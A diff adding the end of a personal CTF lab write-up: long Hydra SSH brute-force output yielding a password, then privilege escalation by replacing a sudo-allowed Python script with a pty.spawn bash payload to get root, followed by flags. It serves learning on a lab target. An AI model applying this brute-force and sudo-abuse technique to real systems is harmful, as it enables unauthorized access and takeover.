@@ -256,3 +256,262 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-12-26 13:20:
 [ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "daniela" - 97 of 14344422 [child 43] (0/23)
 [ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "lauren" - 98 of 14344422 [child 45] (0/23)
 [ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "mickey" - 99 of 14344422 [child 51] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "princesa" - 100 of 14344422 [child 53] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "alexandra" - 101 of 14344422 [child 55] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "alexis" - 102 of 14344422 [child 59] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "jesus" - 103 of 14344422 [child 60] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "estrella" - 104 of 14344422 [child 62] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "miguel" - 105 of 14344422 [child 63] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "william" - 106 of 14344422 [child 21] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "thomas" - 107 of 14344422 [child 22] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "beautiful" - 108 of 14344422 [child 5] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "mylove" - 109 of 14344422 [child 0] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "angela" - 110 of 14344422 [child 9] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "poohbear" - 111 of 14344422 [child 32] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "patrick" - 112 of 14344422 [child 56] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "iloveme" - 113 of 14344422 [child 14] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "sakura" - 114 of 14344422 [child 41] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "adrian" - 115 of 14344422 [child 59] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "alexander" - 116 of 14344422 [child 17] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "destiny" - 117 of 14344422 [child 60] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "christian" - 118 of 14344422 [child 62] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "121212" - 119 of 14344422 [child 63] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "sayang" - 120 of 14344422 [child 7] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "america" - 121 of 14344422 [child 38] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "dancer" - 122 of 14344422 [child 19] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "monica" - 123 of 14344422 [child 34] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "richard" - 124 of 14344422 [child 42] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "112233" - 125 of 14344422 [child 51] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "princess1" - 126 of 14344422 [child 6] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "555555" - 127 of 14344422 [child 23] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "diamond" - 128 of 14344422 [child 37] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "carolina" - 129 of 14344422 [child 1] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "steven" - 130 of 14344422 [child 3] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "rangers" - 131 of 14344422 [child 4] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "louise" - 132 of 14344422 [child 8] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "orange" - 133 of 14344422 [child 11] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "789456" - 134 of 14344422 [child 12] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "999999" - 135 of 14344422 [child 13] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "shorty" - 136 of 14344422 [child 18] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "11111" - 137 of 14344422 [child 20] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "nathan" - 138 of 14344422 [child 24] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "snoopy" - 139 of 14344422 [child 25] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "gabriel" - 140 of 14344422 [child 35] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "hunter" - 141 of 14344422 [child 39] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "cherry" - 142 of 14344422 [child 43] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "killer" - 143 of 14344422 [child 45] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "sandra" - 144 of 14344422 [child 53] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "alejandro" - 145 of 14344422 [child 55] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "buster" - 146 of 14344422 [child 58] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "george" - 147 of 14344422 [child 0] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "brittany" - 148 of 14344422 [child 21] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "alejandra" - 149 of 14344422 [child 22] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "patricia" - 150 of 14344422 [child 5] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "rachel" - 151 of 14344422 [child 23] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "tequiero" - 152 of 14344422 [child 6] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "7777777" - 153 of 14344422 [child 37] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "cheese" - 154 of 14344422 [child 41] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "159753" - 155 of 14344422 [child 59] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "arsenal" - 156 of 14344422 [child 3] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "dolphin" - 157 of 14344422 [child 14] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "antonio" - 158 of 14344422 [child 38] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "heather" - 159 of 14344422 [child 39] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "david" - 160 of 14344422 [child 43] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "ginger" - 161 of 14344422 [child 13] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "stephanie" - 162 of 14344422 [child 24] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "peanut" - 163 of 14344422 [child 25] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "blink182" - 164 of 14344422 [child 35] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "sweetie" - 165 of 14344422 [child 53] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "222222" - 166 of 14344422 [child 62] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "beauty" - 167 of 14344422 [child 45] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "987654" - 168 of 14344422 [child 56] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "victoria" - 169 of 14344422 [child 63] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "honey" - 170 of 14344422 [child 11] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "00000" - 171 of 14344422 [child 19] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "fernando" - 172 of 14344422 [child 20] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "pokemon" - 173 of 14344422 [child 32] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "maggie" - 174 of 14344422 [child 58] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "corazon" - 175 of 14344422 [child 60] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "chicken" - 176 of 14344422 [child 1] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "pepper" - 177 of 14344422 [child 4] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "cristina" - 178 of 14344422 [child 7] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "rainbow" - 179 of 14344422 [child 8] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "kisses" - 180 of 14344422 [child 9] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "manuel" - 181 of 14344422 [child 12] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "myspace" - 182 of 14344422 [child 17] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "rebelde" - 183 of 14344422 [child 18] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "angel1" - 184 of 14344422 [child 34] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "ricardo" - 185 of 14344422 [child 42] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "babygurl" - 186 of 14344422 [child 51] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "heaven" - 187 of 14344422 [child 55] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "55555" - 188 of 14344422 [child 0] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "baseball" - 189 of 14344422 [child 21] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "martin" - 190 of 14344422 [child 22] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "greenday" - 191 of 14344422 [child 5] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "november" - 192 of 14344422 [child 23] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "alyssa" - 193 of 14344422 [child 13] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "madison" - 194 of 14344422 [child 37] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "mother" - 195 of 14344422 [child 38] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "123321" - 196 of 14344422 [child 43] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "123abc" - 197 of 14344422 [child 6] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "mahalkita" - 198 of 14344422 [child 17] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "batman" - 199 of 14344422 [child 32] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "september" - 200 of 14344422 [child 41] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "december" - 201 of 14344422 [child 60] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "morgan" - 202 of 14344422 [child 4] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "mariposa" - 203 of 14344422 [child 7] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "maria" - 204 of 14344422 [child 18] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "gabriela" - 205 of 14344422 [child 19] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "iloveyou2" - 206 of 14344422 [child 55] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "bailey" - 207 of 14344422 [child 62] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "jeremy" - 208 of 14344422 [child 3] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "pamela" - 209 of 14344422 [child 8] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "kimberly" - 210 of 14344422 [child 35] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "gemini" - 211 of 14344422 [child 58] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "shannon" - 212 of 14344422 [child 59] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "pictures" - 213 of 14344422 [child 1] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "asshole" - 214 of 14344422 [child 12] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "sophie" - 215 of 14344422 [child 34] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "jessie" - 216 of 14344422 [child 39] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "hellokitty" - 217 of 14344422 [child 42] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "claudia" - 218 of 14344422 [child 63] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "babygirl1" - 219 of 14344422 [child 9] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "angelica" - 220 of 14344422 [child 11] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "austin" - 221 of 14344422 [child 14] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "mahalko" - 222 of 14344422 [child 20] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "victor" - 223 of 14344422 [child 24] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "horses" - 224 of 14344422 [child 25] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "tiffany" - 225 of 14344422 [child 45] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "mariana" - 226 of 14344422 [child 51] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "eduardo" - 227 of 14344422 [child 53] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "andres" - 228 of 14344422 [child 56] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "courtney" - 229 of 14344422 [child 0] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "booboo" - 230 of 14344422 [child 21] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "kissme" - 231 of 14344422 [child 22] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "harley" - 232 of 14344422 [child 5] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "ronaldo" - 233 of 14344422 [child 23] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "iloveyou1" - 234 of 14344422 [child 13] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "precious" - 235 of 14344422 [child 6] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "october" - 236 of 14344422 [child 38] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "inuyasha" - 237 of 14344422 [child 41] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "peaches" - 238 of 14344422 [child 43] (0/23)
+[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "veronica" - 239 of 14344422 [child 37] (0/23)
+[22][ssh] host: 10.10.253.155   login: meliodas   password: iloveyou1
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 23 final worker threads did not complete until end.
+[ERROR] 23 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-12-26 13:20:46
+
+meliodas : iloveyou1
+```
+
+## Privilege Escalation
+```text
+┌──(kali㉿kali)-[~]
+└─$ ssh meliodas@10.10.253.155
+The authenticity of host '10.10.253.155 (10.10.253.155)' can't be established.
+ED25519 key fingerprint is SHA256:Ykgtf0Q1wQcyrBaGkW4BEBf3eK/QPGXnmEMgpaLxmzs.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.253.155' (ED25519) to the list of known hosts.
+meliodas@10.10.253.155's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+Last login: Sat Aug 24 14:51:01 2019 from 192.168.15.118
+meliodas@ubuntu:~$ whoami
+meliodas
+meliodas@ubuntu:~$ pwd
+/home/meliodas
+meliodas@ubuntu:~$ ls
+bak.py  user.txt
+meliodas@ubuntu:~$ cat user.txt
+6d488cbb3f111d135722c33cb635f4ec
+
+meliodas@ubuntu:~$ cat bak.py 
+#!/usr/bin/env python
+import os
+import zipfile
+
+def zipdir(path, ziph):
+    for root, dirs, files in os.walk(path):
+        for file in files:
+            ziph.write(os.path.join(root, file))
+
+if __name__ == '__main__':
+    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
+    zipdir('/var/www/html', zipf)
+    zipf.close()
+meliodas@ubuntu:~$ sudo -l
+Matching Defaults entries for meliodas on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User meliodas may run the following commands on ubuntu:
+    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
+
+meliodas@ubuntu:~$ find / -perm -4000 -type f 2>/dev/null | xargs ls -lah
+-rwsr-xr-x 1 root root        31K Jul 12  2016 /bin/fusermount
+-rwsr-xr-x 1 root root        40K May 15  2019 /bin/mount
+-rwsr-xr-x 1 root root        44K May  7  2014 /bin/ping
+-rwsr-xr-x 1 root root        44K May  7  2014 /bin/ping6
+-rwsr-xr-x 1 root root        40K Mar 26  2019 /bin/su
+-rwsr-xr-x 1 root root        27K May 15  2019 /bin/umount
+-rwsr-xr-x 1 root root        71K Mar 26  2019 /usr/bin/chfn
+-rwsr-xr-x 1 root root        40K Mar 26  2019 /usr/bin/chsh
+-rwsr-xr-x 1 root root        74K Mar 26  2019 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root        39K Mar 26  2019 /usr/bin/newgrp
+-rwsr-xr-x 1 root root        53K Mar 26  2019 /usr/bin/passwd
+-rwsr-xr-x 1 root root       134K Jun 10  2019 /usr/bin/sudo
+-rwsr-xr-x 1 root root        11K May  8  2018 /usr/bin/vmware-user-suid-wrapper
+-rwsr-xr-- 1 root messagebus  42K Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root        10K Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root       419K Mar  4  2019 /usr/lib/openssh/ssh-keysign
+
+Este código es un script de Python que se utiliza para crear un archivo ZIP que contiene el contenido de un directorio especificado. El script comienza importando dos módulos de Python: "os" y "zipfile". Luego define una función "zipdir" que recibe dos argumentos: "path", que es la ruta del directorio que se va a comprimir, y "ziph", que es un objeto "ZipFile" que se utilizará para escribir el archivo ZIP.
+
+La función "zipdir" utiliza el método "os.walk" para recorrer recursivamente el directorio especificado y para obtener una lista de todos los archivos y subdirectorios en ese directorio. Luego, para cada archivo en la lista, utiliza el método "write" del objeto "ZipFile" para añadir el archivo al archivo ZIP.
+
+El código principal del script crea un objeto "ZipFile" llamado "zipf" y especifica la ruta del archivo ZIP que se va a crear ('/var/backups/website.zip') y el modo de escritura ('w'). Luego llama a la función "zipdir" para comprimir el directorio '/var/www/html' en el archivo ZIP y cierra el archivo ZIP utilizando el método "close".
+
+En resumen, este script se utiliza para crear un archivo ZIP que contiene el contenido de un directorio especificado, y se puede utilizar para hacer copias de seguridad de ese directorio o para comprimir el contenido para su fácil distribución.
+
+meliodas@ubuntu:~$ ls -lah
+total 40K
+drwxr-xr-x 4 meliodas meliodas 4.0K Aug 24  2019 .
+drwxr-xr-x 3 root     root     4.0K Aug 23  2019 ..
+-rw-r--r-- 1 root     root      353 Aug 23  2019 bak.py
+
+can't edit bak.py so remove it and create a new one with the same 
+
+meliodas@ubuntu:~$ rm bak.py
+rm: remove write-protected regular file 'bak.py'? yes
+meliodas@ubuntu:~$ ls
+user.txt
+
+meliodas@ubuntu:~$ nano bak.py 
+meliodas@ubuntu:~$ sudo /usr/bin/python3 /home/meliodas/bak.py
+root@ubuntu:~# exit
+exit
+meliodas@ubuntu:~$ cat bak.py
+import pty;pty.spawn("/bin/bash")
+
+or
+
+meliodas@ubuntu:~$ echo 'import pty;pty.spawn("/bin/bash")' > bak.py
+meliodas@ubuntu:~$ sudo /usr/bin/python3 /home/meliodas/bak.py
+root@ubuntu:~# cat /root/root.txt
+e8c8c6c256c35515d1d344ee0488c617
+```
+![[Pasted image 20221226131618.png]]
+user.txt
+*6d488cbb3f111d135722c33cb635f4ec*
+root.txt
+*e8c8c6c256c35515d1d344ee0488c617*
+
+## Notes / Lessons Learned
+[[ColddBox Easy]]
+
